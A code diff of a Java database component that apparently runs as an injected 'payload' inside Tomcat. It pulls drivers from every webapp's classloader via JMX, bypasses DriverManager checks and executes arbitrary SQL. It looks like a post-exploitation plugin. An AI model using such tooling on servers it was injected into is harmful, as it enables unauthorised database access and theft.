@@ -1,274 +1,793 @@
 package org.leo.core.component;
 
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.io.Reader;
 import java.io.UnsupportedEncodingException;
 import java.lang.reflect.Method;
+import java.math.BigDecimal;
+import java.math.BigInteger;
+import java.sql.Blob;
+import java.sql.Clob;
 import java.sql.Connection;
 import java.sql.Driver;
+import java.sql.DriverManager;
+import java.sql.PreparedStatement;
 import java.sql.ResultSet;
 import java.sql.ResultSetMetaData;
+import java.sql.SQLException;
+import java.sql.SQLTimeoutException;
+import java.sql.SQLXML;
 import java.sql.Statement;
 import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Iterator;
+import java.util.List;
+import java.util.Map;
 import java.util.Properties;
 import java.util.Set;
 
 /**
- * 数据库操作组件
- * 提供基础的JDBC数据库操作，兼容Java 1.5+
- * 
- * @author LeoSpring
- * @version 2.1
+ * 数据库操作组件。
+ *
+ * <p>组件作为单 class payload 运行在未知的 Java 6+ 容器中，因此只依赖 JDK API，
+ * 并在组件边界完成 JDBC 驱动发现、资源限制、类型归一化和错误结构化。</p>
  */
 public class DatabaseComponent implements Runnable {
 
-    
+    private static final String[] KNOWN_DRIVER_CLASSES = new String[]{
+            "com.mysql.cj.jdbc.Driver",
+            "com.mysql.jdbc.Driver",
+            "org.mariadb.jdbc.Driver",
+            "org.postgresql.Driver",
+            "com.microsoft.sqlserver.jdbc.SQLServerDriver",
+            "net.sourceforge.jtds.jdbc.Driver",
+            "oracle.jdbc.OracleDriver",
+            "oracle.jdbc.driver.OracleDriver",
+            "org.sqlite.JDBC",
+            "org.h2.Driver",
+            "com.ibm.db2.jcc.DB2Driver",
+            "com.clickhouse.jdbc.ClickHouseDriver",
+            "org.duckdb.DuckDBDriver",
+            "net.snowflake.client.jdbc.SnowflakeDriver"
+    };
+
+    private static final int DEFAULT_TIMEOUT_SECONDS = 30;
+    private static final int MAX_TIMEOUT_SECONDS = 300;
+    private static final int DEFAULT_MAX_ROWS = 1000;
+    private static final int MAX_ROWS = 100000;
+    private static final int DEFAULT_MAX_RESULT_BYTES = 4 * 1024 * 1024;
+    private static final int MAX_RESULT_BYTES = 16 * 1024 * 1024;
+    private static final int DEFAULT_MAX_CELL_BYTES = 1024 * 1024;
+    private static final int MAX_CELL_BYTES = 4 * 1024 * 1024;
+    private static final int DEFAULT_FETCH_SIZE = 200;
+    private static final int MAX_FETCH_SIZE = 10000;
+
     private HashMap<String, Object> params;
     private HashMap<String, Object> results;
+    private boolean driverClassFound;
+    private boolean driverRejectedUrl;
+    private String driverLoadError;
+    private String selectedLoader;
+    private boolean cellValueTruncated;
 
-
-    /**
-     * 组件执行入口
-     */
     public void run() {
-        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
+        java.lang.reflect.InvocationHandler h =
+                (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
             params = copyStringObjectMap(h.invoke(null, null, null));
-            results = new java.util.HashMap<String, Object>();
+            results = new HashMap<String, Object>();
             invoke();
         } catch (Throwable t) {
-            if (results == null) results = new java.util.HashMap<String, Object>();
-            results.put("code", Integer.valueOf(500));
-            results.put("msg", t.getMessage() != null ? t.getMessage() : t.getClass().getName());
+            if (results == null) results = new HashMap<String, Object>();
+            putEmptyResults();
+            putError(500, "COMPONENT_ERROR", safeMessage(t), null, false);
         }
         if (results != null) {
             try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
         }
     }
 
+    public void invoke() {
+        if (results == null) results = new HashMap<String, Object>();
+        putEmptyResults();
+        if ("capabilities".equalsIgnoreCase(getStringParam("operation"))) {
+            inspectRuntimeCapabilities();
+            return;
+        }
 
-    /**
-     * 主要执行方法
-     */
-    public void invoke() throws Exception {
+        String provider = getStringParam("provider");
         String url = getStringParam("jdbcUrl");
         String user = getStringParam("username");
         String password = getStringParam("password");
         String sql = getStringParam("sql");
-        String driver = getStringParam("driverClass");
+        String driverClass = getStringParam("driverClass");
 
-        // 参数校验，统一返回格式
-        if (url == null || url.trim().length() == 0 || sql == null || sql.trim().length() == 0
-                || driver == null || driver.trim().length() == 0) {
-            results.put("code", 400);
-            results.put("msg", "缺少必填参数: driverClass、jdbcUrl 或 sql");
-            putEmptyResults();
-            return;
-        }
-
-        ArrayList<HashMap<String, Object>> columns = new ArrayList<HashMap<String, Object>>();
-        ArrayList<HashMap<String, Object>> rows = new ArrayList<HashMap<String, Object>>();
-        int updateCount = 0;
-        Connection conn = null;
-        Statement stmt = null;
-        ResultSet rs = null;
+        Connection connection = null;
+        PreparedStatement statement = null;
+        ResultSet resultSet = null;
         try {
-            conn = openConnection(driver, url, user, password);
-            stmt = conn.createStatement();
-            boolean hasResult = stmt.execute(sql);
+            if (provider != null && provider.trim().length() > 0
+                    && !"jdbc".equalsIgnoreCase(provider.trim())) {
+                throw new IllegalArgumentException("DatabaseComponent 仅支持 jdbc provider");
+            }
+            if (isBlank(driverClass) || isBlank(url) || isBlank(sql)) {
+                throw new IllegalArgumentException("缺少必填参数: driverClass、jdbcUrl 或 sql");
+            }
+
+            int timeoutSeconds = getBoundedIntParam("queryTimeoutSeconds",
+                    getBoundedIntParam("timeoutSeconds", DEFAULT_TIMEOUT_SECONDS, 0, MAX_TIMEOUT_SECONDS),
+                    0, MAX_TIMEOUT_SECONDS);
+            int maxRows = getBoundedIntParam("maxRows", DEFAULT_MAX_ROWS, 1, MAX_ROWS);
+            int maxResultBytes = getBoundedIntParam("maxResultBytes",
+                    DEFAULT_MAX_RESULT_BYTES, 1024, MAX_RESULT_BYTES);
+            int maxCellBytes = getBoundedIntParam("maxCellBytes",
+                    DEFAULT_MAX_CELL_BYTES, 256, MAX_CELL_BYTES);
+            int fetchSize = getBoundedIntParam("fetchSize", DEFAULT_FETCH_SIZE, 0, MAX_FETCH_SIZE);
+
+            Properties connectionProperties = connectionProperties();
+            connection = openConnection(driverClass.trim(), url.trim(), user, password, connectionProperties);
+            statement = prepareStatement(connection, sql);
+            bindParameters(statement, params.get("parameters"));
+            if (timeoutSeconds > 0) statement.setQueryTimeout(timeoutSeconds);
+            if (fetchSize > 0) {
+                try { statement.setFetchSize(fetchSize); } catch (SQLException ignored) {}
+            }
+
+            boolean hasResult = statement.execute();
+            ArrayList<HashMap<String, Object>> columns = new ArrayList<HashMap<String, Object>>();
+            ArrayList<HashMap<String, Object>> rows = new ArrayList<HashMap<String, Object>>();
+            boolean truncated = false;
+            String truncationReason = null;
+            int resultBytes = 0;
+            int updateCount = 0;
+
             if (hasResult) {
-                rs = stmt.getResultSet();
-                ResultSetMetaData metaData = rs.getMetaData();
-                int columnCount = metaData.getColumnCount();
-                for (int i = 1; i <= columnCount; i++) {
+                resultSet = statement.getResultSet();
+                ResultSetMetaData metadata = resultSet.getMetaData();
+                int columnCount = metadata.getColumnCount();
+                ArrayList<String> columnKeys = new ArrayList<String>();
+                HashSet<String> usedKeys = new HashSet<String>();
+                int columnIndex;
+                for (columnIndex = 1; columnIndex <= columnCount; columnIndex++) {
+                    String label = safeColumnLabel(metadata, columnIndex);
+                    String nativeName = safeColumnName(metadata, columnIndex);
+                    String key = uniqueColumnKey(label, nativeName, columnIndex, usedKeys);
+                    columnKeys.add(key);
+
                     HashMap<String, Object> column = new HashMap<String, Object>();
-                    column.put("name", metaData.getColumnName(i));
-                    column.put("label", metaData.getColumnLabel(i));
-                    column.put("type", metaData.getColumnTypeName(i));
-                    column.put("nativeType", metaData.getColumnTypeName(i));
+                    column.put("name", key);
+                    column.put("label", label);
+                    column.put("nativeName", nativeName);
+                    String nativeType = safeColumnTypeName(metadata, columnIndex);
+                    column.put("type", nativeType);
+                    column.put("nativeType", nativeType);
+                    column.put("jdbcType", safeColumnType(metadata, columnIndex));
+                    column.put("precision", safeColumnPrecision(metadata, columnIndex));
+                    column.put("scale", safeColumnScale(metadata, columnIndex));
+                    column.put("nullable", safeColumnNullable(metadata, columnIndex));
                     columns.add(column);
                 }
-                while (rs.next()) {
+
+                while (resultSet.next()) {
+                    if (rows.size() >= maxRows) {
+                        truncated = true;
+                        truncationReason = "MAX_ROWS";
+                        break;
+                    }
                     HashMap<String, Object> row = new HashMap<String, Object>();
-                    for (int i = 1; i <= columnCount; i++) {
-                        row.put(metaData.getColumnLabel(i), rs.getObject(i));
+                    long rowBytes = 0L;
+                    boolean rowCellTruncated = false;
+                    for (columnIndex = 1; columnIndex <= columnCount; columnIndex++) {
+                        cellValueTruncated = false;
+                        Object value = normalizeJdbcValue(resultSet.getObject(columnIndex), maxCellBytes);
+                        String key = columnKeys.get(columnIndex - 1);
+                        row.put(key, value);
+                        rowBytes += utf8Length(key) + estimateValueBytes(value);
+                        if (cellValueTruncated) rowCellTruncated = true;
+                    }
+                    if (((long) resultBytes) + rowBytes > maxResultBytes) {
+                        truncated = true;
+                        truncationReason = "MAX_RESULT_BYTES";
+                        break;
                     }
                     rows.add(row);
+                    resultBytes += rowBytes;
+                    if (rowCellTruncated && !truncated) {
+                        truncated = true;
+                        truncationReason = "MAX_CELL_BYTES";
+                    }
                 }
             } else {
-                updateCount = stmt.getUpdateCount();
+                updateCount = statement.getUpdateCount();
             }
+
+            Object generatedKey = null;
+            if (!hasResult) generatedKey = readGeneratedKey(statement, maxCellBytes);
             results.put("columns", columns);
             results.put("rows", rows);
-            results.put("rowCount", rows.size());
-            results.put("affectedRows", updateCount);
-            results.put("generatedKey", null);
-            HashMap<String, Object> runtimeMetadata = new HashMap<String, Object>();
-            runtimeMetadata.put("provider", "jdbc");
-            runtimeMetadata.put("driver", driver);
-            results.put("runtimeMetadata", runtimeMetadata);
-            results.put("code", 200);
+            results.put("rowCount", Integer.valueOf(rows.size()));
+            results.put("affectedRows", Integer.valueOf(updateCount < 0 ? 0 : updateCount));
+            results.put("generatedKey", generatedKey);
+            results.put("truncated", Boolean.valueOf(truncated));
+            results.put("truncationReason", truncationReason);
+            results.put("resultBytes", Integer.valueOf(resultBytes));
+            results.put("runtimeMetadata", runtimeMetadata(connection, driverClass, timeoutSeconds,
+                    maxRows, maxResultBytes, maxCellBytes));
+            results.put("code", Integer.valueOf(200));
             results.put("msg", "执行成功");
-        } catch (Exception ex) {
-            putEmptyResults();
-            results.put("code", 500);
-            results.put("msg", ex.getMessage());
-            throw ex;
+        } catch (ClassNotFoundException error) {
+            putError(503, "DRIVER_NOT_FOUND", redact(error.getMessage(), password, url), null, false);
+        } catch (IllegalArgumentException error) {
+            String category = safeMessage(error).indexOf("JDBC URL") >= 0
+                    ? "URL_MISMATCH" : "INVALID_ARGUMENT";
+            putError(400, category, redact(safeMessage(error), password, url), null, false);
+        } catch (SQLException error) {
+            putSqlError(error, password, url);
+        } catch (Exception error) {
+            putError(500, "EXECUTION_ERROR", redact(safeMessage(error), password, url), null, false);
         } finally {
-            closeResource(rs);
-            closeResource(stmt);
-            closeResource(conn);
+            closeResource(resultSet);
+            closeResource(statement);
+            closeResource(connection);
         }
     }
 
     private void putEmptyResults() {
         results.put("columns", new ArrayList<HashMap<String, Object>>());
         results.put("rows", new ArrayList<HashMap<String, Object>>());
-        results.put("rowCount", null);
+        results.put("rowCount", Integer.valueOf(0));
         results.put("affectedRows", Integer.valueOf(0));
         results.put("generatedKey", null);
+        results.put("truncated", Boolean.FALSE);
+        results.put("truncationReason", null);
+        results.put("resultBytes", Integer.valueOf(0));
     }
 
-    /**
-     * 安全关闭资源
-     */
-    private void closeResource(Object resource) {
-        if (resource != null) {
-            try {
-                if (resource instanceof ResultSet) {
-                    ((ResultSet) resource).close();
-                } else if (resource instanceof Statement) {
-                    ((Statement) resource).close();
-                } else if (resource instanceof Connection) {
-                    ((Connection) resource).close();
-                }
-            } catch (Exception e) {
-                // 忽略关闭资源时的异常
-            }
-        }
-    }
-
-    // ==================== Driver 加载与 Connection 获取 ====================
-
-    /**
-     * 打开数据库连接。
-     *
-     * <p>DriverManager 的 SecurityManager 限制：它只允许由调用类同一 ClassLoader
-     * 加载出来的 Driver。当 puppet 注入 Tomcat commonLoader、driver 却在 webapp
-     * 的 WEB-INF/lib 里时，{@code Class.forName(driver)} 会失败。
-     *
-     * <p>本方法依次尝试：
-     * <ol>
-     *   <li>当前线程 contextClassLoader（puppet 自己的 CL）</li>
-     *   <li>system ClassLoader</li>
-     *   <li>所有 Tomcat WebappClassLoader（通过 JMX 查 {@code Catalina:j2eeType=WebModule,*}）</li>
-     * </ol>
-     * 找到 driver 类后通过无参构造器实例化，
-     * 然后用 {@code Driver.connect(url, props)} 直连——绕开 DriverManager 的 CL 检查。
-     */
-    private Connection openConnection(String driver, String url, String user, String password) throws Exception {
-        Class<?> driverClass = loadDriverClass(driver);
-        if (driverClass == null) {
-            throw new ClassNotFoundException(
-                    "JDBC driver not found: " + driver
-                    + "（已尝试 contextClassLoader / systemClassLoader / 所有 Tomcat WebappClassLoader）");
-        }
-        Object driverInstance = driverClass.newInstance();
-
-        // 直接用 Driver.connect(url, props) 而不是 DriverManager.getConnection()
-        // —— DriverManager 会检查 Driver 是否由调用类的 CL 加载，跨 CL 会失败
-        Properties props = new Properties();
-        if (user != null) props.put("user", user);
-        if (password != null) props.put("password", password);
-        Connection conn = ((Driver) driverInstance).connect(url, props);
-        if (conn == null) {
-            throw new Exception("Driver.connect 返回 null（URL 协议可能与 Driver 不匹配）: " + url);
-        }
-        return conn;
-    }
-
-    /** 在多个 ClassLoader 里尝试加载 driver 类，返回第一个成功的。 */
-    private Class<?> loadDriverClass(String driver) {
-        // 1. 当前线程 contextClassLoader
-        Class<?> c = tryLoad(Thread.currentThread().getContextClassLoader(), driver);
-        if (c != null) return c;
-
-        // 2. system ClassLoader
-        c = tryLoad(ClassLoader.getSystemClassLoader(), driver);
-        if (c != null) return c;
-
-        // 3. 兜底：所有 Tomcat WebappClassLoader
+    private void inspectRuntimeCapabilities() {
+        results.clear();
+        ArrayList<HashMap<String, Object>> drivers = new ArrayList<HashMap<String, Object>>();
+        HashSet<String> registeredNames = new HashSet<String>();
         try {
-            HashSet<ClassLoader> webappLoaders = collectWebappClassLoaders();
-            Iterator<ClassLoader> iter = webappLoaders.iterator();
-            while (iter.hasNext()) {
-                ClassLoader cl = iter.next();
-                c = tryLoad(cl, driver);
-                if (c != null) return c;
+            Enumeration registered = DriverManager.getDrivers();
+            while (registered.hasMoreElements()) {
+                Object value = registered.nextElement();
+                if (value instanceof Driver) {
+                    registeredNames.add(value.getClass().getName());
+                }
             }
         } catch (Throwable ignored) {
+        }
+
+        HashSet<String> candidates = new HashSet<String>();
+        candidates.addAll(registeredNames);
+        int index;
+        for (index = 0; index < KNOWN_DRIVER_CLASSES.length; index++) {
+            candidates.add(KNOWN_DRIVER_CLASSES[index]);
+        }
+        String requested = getStringParam("requestedDriver");
+        if (!isBlank(requested)) candidates.add(requested.trim());
+
+        ArrayList<String> candidateNames = new ArrayList<String>(candidates);
+        Collections.sort(candidateNames);
+        for (index = 0; index < candidateNames.size(); index++) {
+            String className = candidateNames.get(index);
+            boolean available = registeredNames.contains(className) || canLoadDriverClass(className);
+            if (available || className.equals(requested)) {
+                HashMap<String, Object> item = new HashMap<String, Object>();
+                item.put("id", className);
+                item.put("className", className);
+                item.put("available", Boolean.valueOf(available));
+                item.put("registered", Boolean.valueOf(registeredNames.contains(className)));
+                drivers.add(item);
+            }
+        }
+
+        HashMap<String, Object> requestedStatus = new HashMap<String, Object>();
+        requestedStatus.put("id", isBlank(requested) ? "" : requested.trim());
+        boolean requestedAvailable = isBlank(requested)
+                || registeredNames.contains(requested.trim()) || canLoadDriverClass(requested.trim());
+        requestedStatus.put("available", Boolean.valueOf(requestedAvailable));
+        requestedStatus.put("message", isBlank(requested)
+                ? "未指定 JDBC 驱动"
+                : requestedAvailable ? "JDBC 驱动可加载" : "JDBC 驱动类不可用");
+
+        HashMap<String, Object> constraints = new HashMap<String, Object>();
+        constraints.put("requiresInstalledDriver", Boolean.TRUE);
+        constraints.put("remoteInstallSupported", Boolean.FALSE);
+        constraints.put("customConnectorSupported", Boolean.TRUE);
+
+        results.put("code", Integer.valueOf(200));
+        results.put("msg", "数据库运行时能力探测成功");
+        results.put("runtime", "java");
+        results.put("provider", "jdbc");
+        results.put("available", Boolean.TRUE);
+        results.put("drivers", drivers);
+        results.put("requestedDriver", requestedStatus);
+        results.put("constraints", constraints);
+    }
+
+    private boolean canLoadDriverClass(String className) {
+        if (isBlank(className)) return false;
+        ArrayList<ClassLoader> loaders = collectCandidateClassLoaders();
+        int index;
+        for (index = 0; index < loaders.size(); index++) {
+            try {
+                Class candidate = Class.forName(className, false, loaders.get(index));
+                if (Driver.class.isAssignableFrom(candidate)) return true;
+            } catch (Throwable ignored) {
+            }
+        }
+        return false;
+    }
+
+    private void putSqlError(SQLException error, String password, String url) {
+        String state = error.getSQLState();
+        String category = "SQL_ERROR";
+        int code = 422;
+        boolean retryable = false;
+        if (error instanceof SQLTimeoutException || "HYT00".equals(state) || "HYT01".equals(state)) {
+            category = "QUERY_TIMEOUT";
+            code = 504;
+            retryable = true;
+        } else if (state != null && state.startsWith("08")) {
+            category = "CONNECTION_ERROR";
+            code = 503;
+            retryable = true;
+        } else if (state != null && state.startsWith("28")) {
+            category = "AUTHENTICATION_ERROR";
+        } else if (state != null && state.startsWith("40")) {
+            category = "TRANSACTION_ROLLBACK";
+            retryable = true;
+        }
+        putError(code, category, redact(safeMessage(error), password, url), state, retryable);
+        results.put("vendorCode", Integer.valueOf(error.getErrorCode()));
+    }
+
+    private void putError(int code, String category, String message, String sqlState, boolean retryable) {
+        results.put("code", Integer.valueOf(code));
+        results.put("msg", isBlank(message) ? category : message);
+        results.put("errorCategory", category);
+        results.put("sqlState", sqlState);
+        results.put("retryable", Boolean.valueOf(retryable));
+    }
+
+    private PreparedStatement prepareStatement(Connection connection, String sql) throws SQLException {
+        try {
+            return connection.prepareStatement(sql, Statement.RETURN_GENERATED_KEYS);
+        } catch (SQLException ignored) {
+            return connection.prepareStatement(sql);
+        }
+    }
+
+    private void bindParameters(PreparedStatement statement, Object value) throws SQLException {
+        if (value == null) return;
+        if (!(value instanceof List)) {
+            throw new IllegalArgumentException("parameters 必须是数组");
+        }
+        List parameters = (List) value;
+        int index;
+        for (index = 0; index < parameters.size(); index++) {
+            Object parameter = parameters.get(index);
+            if (parameter instanceof byte[]) {
+                statement.setBytes(index + 1, (byte[]) parameter);
+            } else {
+                statement.setObject(index + 1, parameter);
+            }
+        }
+    }
+
+    private Object readGeneratedKey(PreparedStatement statement, int maxCellBytes) {
+        ResultSet keys = null;
+        try {
+            keys = statement.getGeneratedKeys();
+            if (keys != null && keys.next()) return normalizeJdbcValue(keys.getObject(1), maxCellBytes);
+        } catch (Throwable ignored) {
+        } finally {
+            closeResource(keys);
         }
         return null;
     }
 
-    private Class<?> tryLoad(ClassLoader cl, String name) {
-        if (cl == null) return null;
+    private HashMap<String, Object> runtimeMetadata(Connection connection, String driverClass,
+                                                     int timeoutSeconds, int maxRows,
+                                                     int maxResultBytes, int maxCellBytes) {
+        HashMap<String, Object> metadata = new HashMap<String, Object>();
+        metadata.put("provider", "jdbc");
+        metadata.put("driverClass", driverClass);
+        metadata.put("classLoader", selectedLoader);
+        metadata.put("queryTimeoutSeconds", Integer.valueOf(timeoutSeconds));
+        metadata.put("maxRows", Integer.valueOf(maxRows));
+        metadata.put("maxResultBytes", Integer.valueOf(maxResultBytes));
+        metadata.put("maxCellBytes", Integer.valueOf(maxCellBytes));
         try {
-            return Class.forName(name, true, cl);
-        } catch (Throwable t) {
-            return null;
+            java.sql.DatabaseMetaData databaseMetadata = connection.getMetaData();
+            metadata.put("driverName", databaseMetadata.getDriverName());
+            metadata.put("driverVersion", databaseMetadata.getDriverVersion());
+            metadata.put("databaseProduct", databaseMetadata.getDatabaseProductName());
+            metadata.put("databaseVersion", databaseMetadata.getDatabaseProductVersion());
+        } catch (Throwable ignored) {
+        }
+        return metadata;
+    }
+
+    private Properties connectionProperties() {
+        Properties properties = new Properties();
+        Object value = params.get("connectionProperties");
+        if (value == null) return properties;
+        if (!(value instanceof Map)) {
+            throw new IllegalArgumentException("connectionProperties 必须是对象");
+        }
+        Map source = (Map) value;
+        Iterator iterator = source.entrySet().iterator();
+        while (iterator.hasNext()) {
+            Map.Entry entry = (Map.Entry) iterator.next();
+            if (entry.getKey() != null && entry.getValue() != null) {
+                properties.setProperty(String.valueOf(entry.getKey()), String.valueOf(entry.getValue()));
+            }
+        }
+        return properties;
+    }
+
+    private Connection openConnection(String driverClassName, String url, String user,
+                                      String password, Properties properties) throws Exception {
+        Driver driver = loadDriver(driverClassName, url);
+        if (driver == null) {
+            if (driverRejectedUrl) {
+                throw new IllegalArgumentException("JDBC URL 与驱动不匹配: " + redactUrl(url));
+            }
+            if (driverClassFound) {
+                throw new IllegalStateException("JDBC driver 初始化失败: " + driverClassName
+                        + (isBlank(driverLoadError) ? "" : " (" + driverLoadError + ")"));
+            }
+            throw new ClassNotFoundException("JDBC driver not found: " + driverClassName);
+        }
+        if (!isBlank(user)) properties.setProperty("user", user);
+        if (!isBlank(password) || !isBlank(user)) properties.setProperty("password", password == null ? "" : password);
+        Connection connection = driver.connect(url, properties);
+        if (connection == null) {
+            throw new IllegalArgumentException("JDBC URL 与驱动不匹配: " + redactUrl(url));
+        }
+        return connection;
+    }
+
+    private Driver loadDriver(String driverClassName, String url) {
+        driverClassFound = false;
+        driverRejectedUrl = false;
+        driverLoadError = null;
+        selectedLoader = null;
+        ArrayList<ClassLoader> loaders = collectCandidateClassLoaders();
+        int index;
+        for (index = 0; index < loaders.size(); index++) {
+            ClassLoader loader = loaders.get(index);
+            Class driverClass;
+            try {
+                driverClass = Class.forName(driverClassName, true, loader);
+            } catch (Throwable ignored) {
+                continue;
+            }
+            driverClassFound = true;
+            try {
+                Object instance = driverClass.newInstance();
+                if (!(instance instanceof Driver)) {
+                    driverLoadError = "类未实现 java.sql.Driver";
+                    continue;
+                }
+                Driver driver = (Driver) instance;
+                if (!driver.acceptsURL(url)) {
+                    driverRejectedUrl = true;
+                    continue;
+                }
+                selectedLoader = loader.getClass().getName();
+                return driver;
+            } catch (Throwable error) {
+                driverLoadError = safeMessage(error);
+            }
+        }
+        return null;
+    }
+
+    private ArrayList<ClassLoader> collectCandidateClassLoaders() {
+        ArrayList<ClassLoader> result = new ArrayList<ClassLoader>();
+        HashSet<ClassLoader> seen = new HashSet<ClassLoader>();
+        addLoader(result, seen, Thread.currentThread().getContextClassLoader());
+        addLoader(result, seen, getClass().getClassLoader());
+        addLoader(result, seen, ClassLoader.getSystemClassLoader());
+        try {
+            Iterator threads = Thread.getAllStackTraces().keySet().iterator();
+            while (threads.hasNext()) {
+                Thread thread = (Thread) threads.next();
+                addLoader(result, seen, thread.getContextClassLoader());
+            }
+        } catch (Throwable ignored) {
+        }
+        try {
+            Iterator loaders = collectWebappClassLoaders().iterator();
+            while (loaders.hasNext()) addLoader(result, seen, (ClassLoader) loaders.next());
+        } catch (Throwable ignored) {
+        }
+        return result;
+    }
+
+    private void addLoader(ArrayList<ClassLoader> result, HashSet<ClassLoader> seen, ClassLoader loader) {
+        ClassLoader current = loader;
+        while (current != null && !seen.contains(current)) {
+            seen.add(current);
+            result.add(current);
+            current = current.getParent();
         }
     }
 
-    /**
-     * 通过 PlatformMBeanServer 找所有 Tomcat WebappClassLoader。
-     * 复用 {@link ResourceComponent} 同款实现的简化版。
-     */
     private HashSet<ClassLoader> collectWebappClassLoaders() throws Throwable {
         HashSet<ClassLoader> result = new HashSet<ClassLoader>();
-        Class<?> mfClass = Class.forName("java.lang.management.ManagementFactory");
-        Object mbs = mfClass.getMethod("getPlatformMBeanServer").invoke(null);
-        Class<?> onClass = Class.forName("javax.management.ObjectName");
-        Object pattern = onClass.getConstructor(String.class)
-                .newInstance("Catalina:j2eeType=WebModule,*");
-        Method queryNames = mbs.getClass().getMethod("queryNames", onClass,
-                Class.forName("javax.management.QueryExp"));
-        Object queriedNames = queryNames.invoke(mbs, pattern, null);
+        Class mfClass = Class.forName("java.lang.management.ManagementFactory");
+        Object mbs = mfClass.getMethod("getPlatformMBeanServer", new Class[0]).invoke(null, new Object[0]);
+        Class onClass = Class.forName("javax.management.ObjectName");
+        Object pattern = onClass.getConstructor(new Class[]{String.class})
+                .newInstance(new Object[]{"Catalina:j2eeType=WebModule,*"});
+        Method queryNames = mbs.getClass().getMethod("queryNames", new Class[]{onClass,
+                Class.forName("javax.management.QueryExp")});
+        Object queriedNames = queryNames.invoke(mbs, new Object[]{pattern, null});
         if (!(queriedNames instanceof Set)) return result;
-        Set<?> names = (Set<?>) queriedNames;
-        if (names == null || names.isEmpty()) return result;
-        Method getAttribute = mbs.getClass().getMethod("getAttribute", onClass, String.class);
-        Iterator<?> iter = names.iterator();
-        while (iter.hasNext()) {
+        Set names = (Set) queriedNames;
+        Method getAttribute = mbs.getClass().getMethod("getAttribute", new Class[]{onClass, String.class});
+        Iterator iterator = names.iterator();
+        while (iterator.hasNext()) {
             try {
-                Object on = iter.next();
-                Object ctx = getAttribute.invoke(mbs, on, "managedResource");
-                if (ctx == null) continue;
-                Method getLoader = ctx.getClass().getMethod("getLoader");
-                Object loader = getLoader.invoke(ctx);
+                Object objectName = iterator.next();
+                Object context = getAttribute.invoke(mbs, new Object[]{objectName, "managedResource"});
+                if (context == null) continue;
+                Object loader = context.getClass().getMethod("getLoader", new Class[0])
+                        .invoke(context, new Object[0]);
                 if (loader == null) continue;
-                Method getClassLoader = loader.getClass().getMethod("getClassLoader");
-                Object cl = getClassLoader.invoke(loader);
-                if (cl instanceof ClassLoader) {
-                    result.add((ClassLoader) cl);
-                }
+                Object classLoader = loader.getClass().getMethod("getClassLoader", new Class[0])
+                        .invoke(loader, new Object[0]);
+                if (classLoader instanceof ClassLoader) result.add((ClassLoader) classLoader);
             } catch (Throwable ignored) {
             }
         }
         return result;
     }
 
+    private Object normalizeJdbcValue(Object value, int maxCellBytes) throws Exception {
+        if (value == null) return null;
+        if (value instanceof byte[]) return capBytes((byte[]) value, maxCellBytes);
+        if (value instanceof Blob) return readBytes(((Blob) value).getBinaryStream(), maxCellBytes);
+        if (value instanceof Clob) return readText(((Clob) value).getCharacterStream(), maxCellBytes);
+        if (value instanceof SQLXML) return readText(((SQLXML) value).getCharacterStream(), maxCellBytes);
+        if (value instanceof BigDecimal || value instanceof BigInteger) return String.valueOf(value);
+        if (value instanceof java.sql.Date || value instanceof java.sql.Time
+                || value instanceof java.sql.Timestamp || value instanceof java.util.Date) {
+            return String.valueOf(value);
+        }
+        if (value instanceof java.sql.Array) {
+            return capString(String.valueOf(value), maxCellBytes);
+        }
+        if (value instanceof String || value instanceof Boolean || value instanceof Byte
+                || value instanceof Short || value instanceof Integer || value instanceof Long
+                || value instanceof Float || value instanceof Double) {
+            return value instanceof String ? capString((String) value, maxCellBytes) : value;
+        }
+        return capString(String.valueOf(value), maxCellBytes);
+    }
+
+    private byte[] readBytes(InputStream input, int maxBytes) throws Exception {
+        if (input == null) return null;
+        ByteArrayOutputStream output = new ByteArrayOutputStream(Math.min(maxBytes, 8192));
+        byte[] buffer = new byte[4096];
+        int total = 0;
+        try {
+            int read;
+            while ((read = input.read(buffer)) != -1) {
+                int allowed = Math.min(read, maxBytes - total);
+                if (allowed > 0) output.write(buffer, 0, allowed);
+                total += allowed;
+                if (allowed < read || total >= maxBytes) {
+                    if (allowed < read || input.read() != -1) cellValueTruncated = true;
+                    break;
+                }
+            }
+            return output.toByteArray();
+        } finally {
+            try { input.close(); } catch (Throwable ignored) {}
+            try { output.close(); } catch (Throwable ignored) {}
+        }
+    }
+
+    private String readText(Reader reader, int maxBytes) throws Exception {
+        if (reader == null) return null;
+        StringBuilder text = new StringBuilder(Math.min(maxBytes, 8192));
+        char[] buffer = new char[2048];
+        try {
+            int read;
+            while ((read = reader.read(buffer)) != -1) {
+                text.append(buffer, 0, read);
+                if (utf8Length(text.toString()) > maxBytes) {
+                    cellValueTruncated = true;
+                    break;
+                }
+            }
+            return capString(text.toString(), maxBytes);
+        } finally {
+            try { reader.close(); } catch (Throwable ignored) {}
+        }
+    }
+
+    private byte[] capBytes(byte[] value, int maxBytes) {
+        if (value.length <= maxBytes) return value;
+        byte[] truncated = new byte[maxBytes];
+        System.arraycopy(value, 0, truncated, 0, maxBytes);
+        cellValueTruncated = true;
+        return truncated;
+    }
+
+    private String capString(String value, int maxBytes) {
+        if (utf8Length(value) <= maxBytes) return value;
+        int low = 0;
+        int high = value.length();
+        while (low < high) {
+            int middle = (low + high + 1) / 2;
+            if (utf8Length(value.substring(0, middle)) <= maxBytes) low = middle;
+            else high = middle - 1;
+        }
+        cellValueTruncated = true;
+        return value.substring(0, low);
+    }
+
+    private long estimateValueBytes(Object value) {
+        if (value == null) return 4L;
+        if (value instanceof byte[]) return ((byte[]) value).length;
+        if (value instanceof List) {
+            long size = 2L;
+            Iterator iterator = ((List) value).iterator();
+            while (iterator.hasNext()) size += estimateValueBytes(iterator.next());
+            return size;
+        }
+        return utf8Length(String.valueOf(value));
+    }
+
+    private String uniqueColumnKey(String label, String nativeName, int index, HashSet<String> used) {
+        String base = !isBlank(label) ? label : (!isBlank(nativeName) ? nativeName : "column" + index);
+        String candidate = base;
+        int suffix = 2;
+        while (used.contains(candidate)) {
+            candidate = base + "_" + suffix;
+            suffix++;
+        }
+        used.add(candidate);
+        return candidate;
+    }
+
+    private String safeColumnLabel(ResultSetMetaData metadata, int index) {
+        try {
+            String label = metadata.getColumnLabel(index);
+            return isBlank(label) ? safeColumnName(metadata, index) : label;
+        } catch (Throwable ignored) {
+            return safeColumnName(metadata, index);
+        }
+    }
+
